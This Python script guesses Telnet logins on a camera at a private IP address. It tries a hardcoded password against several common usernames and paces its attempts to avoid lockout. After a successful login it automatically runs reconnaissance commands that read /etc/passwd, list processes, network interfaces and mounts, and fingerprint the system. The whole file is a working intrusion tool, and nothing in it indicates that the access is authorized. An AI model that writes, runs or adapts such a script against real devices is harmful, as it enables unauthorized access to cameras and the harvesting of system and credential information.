"""
Telnet probe for 10.172.139.14
Tries provided password against common camera usernames.
Better failure detection — waits 4s for camera to respond before declaring success.
"""
import telnetlib
import sys
import time
import re

HOST = "10.172.139.14"
PORT = 23
PASSWORD = b"W3st.U3er.W3st"
# Try usernames matching the password's l33t-speak hint ("U3er" = "user")
USERNAMES = [b"admin", b"user"]  # already tried root, skip to next

ENUM_COMMANDS = [
    b"id",
    b"uname -a",
    b"cat /proc/version",
    b"cat /proc/cpuinfo | head -20",
    b"ls -la /",
    b"ls -la /opt 2>/dev/null",
    b"cat /etc/passwd",
    b"mount",
    b"ps 2>/dev/null | head -30",
    b"ifconfig 2>/dev/null || ip a 2>/dev/null",
    b"netstat -tnl 2>/dev/null | head",
    b"cat /proc/cmdline",
    b"cat /etc/issue 2>/dev/null; cat /etc/os-release 2>/dev/null",
    b"ls /dev/ttyS* /dev/ttyAMA* 2>/dev/null",
    b"echo '=== ENUM_DONE ==='",
]


def try_login(username):
    print(f"\n--- Trying {username.decode()}:{PASSWORD.decode()} ---", flush=True)
    try:
        tn = telnetlib.Telnet(HOST, PORT, timeout=5)
    except Exception as e:
        print(f"Connect failed: {e}", flush=True)
        return None

    try:
        banner = tn.read_until(b"login:", timeout=5)
        tn.write(username + b"\n")
        prompt = tn.read_until(b"assword:", timeout=5)
        tn.write(PASSWORD + b"\n")

        # Wait longer — slow cameras can take 3-4 seconds to validate
        time.sleep(4)
        response = tn.read_very_eager()
        decoded = response.decode(errors='replace')
        print(f"Response after password: {decoded!r}", flush=True)

        # Failure indicators (case-insensitive)
        lower = decoded.lower()
        if any(s in lower for s in ['incorrect', 'failed', 'denied', 'invalid']):
            print(f"  -> FAILED ({username.decode()})", flush=True)
            tn.close()
            return None
        # Re-prompted for login = also a failure
        if 'login:' in lower:
            print(f"  -> FAILED, re-prompted ({username.decode()})", flush=True)
            tn.close()
            return None

        # Success: prompt likely contains $, #, >, or busybox-style
        if any(c in decoded for c in ['#', '$', '>']):
            print(f"  -> SUCCESS ({username.decode()})", flush=True)
            return tn

        # Ambiguous — send a no-op and check
        tn.write(b"echo __PROBE__\n")
        time.sleep(2)
        probe_resp = tn.read_very_eager().decode(errors='replace')
        print(f"Probe response: {probe_resp!r}", flush=True)
        if '__PROBE__' in probe_resp:
            print(f"  -> SUCCESS confirmed via probe ({username.decode()})", flush=True)
            return tn
        else:
            print(f"  -> AMBIGUOUS, treating as failure", flush=True)
            tn.close()
            return None

    except EOFError:
        print("Connection closed by remote", flush=True)
        return None
    except Exception as e:
        print(f"Error: {e}", flush=True)
        try: tn.close()
        except: pass
        return None


def run_enum(tn):
    print("\n=== AUTHENTICATED — RUNNING ENUM ===\n", flush=True)
    for cmd in ENUM_COMMANDS:
        try:
            tn.write(cmd + b"\n")
            time.sleep(1.5)
            output = tn.read_very_eager().decode(errors='replace')
            print(f"\n>>> {cmd.decode()}", flush=True)
            print(output, flush=True)
        except EOFError:
            print("Connection closed during enum", flush=True)
            break
        except Exception as e:
            print(f"Cmd error: {e}", flush=True)


def main():
    for username in USERNAMES:
        tn = try_login(username)
        if tn:
            run_enum(tn)
            try:
                tn.write(b"exit\n")
                time.sleep(0.5)
                tn.close()
            except: pass
            print("\n=== Session closed ===", flush=True)
            return 0
        time.sleep(2)  # avoid lockout heuristics

    print("\n!!! All attempts in this batch failed. STOPPING. !!!", flush=True)
    print("Already tried: root (earlier run), admin, user", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
